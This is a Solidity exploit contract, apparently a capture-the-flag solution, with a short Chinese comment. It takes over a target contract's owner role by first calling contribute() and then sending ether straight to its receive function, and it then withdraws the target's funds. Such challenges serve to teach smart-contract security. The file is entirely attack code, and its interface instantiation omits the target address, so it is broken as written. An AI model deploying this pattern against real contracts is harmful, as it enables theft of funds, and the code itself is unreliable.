// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Instance {
    
    function contribute() payable external;
    function withdraw() external;
}

contract Attack {
    
    Instance instance = Instance();

    constructor() payable {
        
        instance.contribute{value: msg.value / 2}();
        address(instance).call{value: msg.value / 2}("");
        instance.withdraw();
    }

    fallback() payable external {}

    receive() payable external {}
}

/**
 * 要先用contribute转进0.001eth，然后通过receive夺取合约的owner
 *  
 *  
 */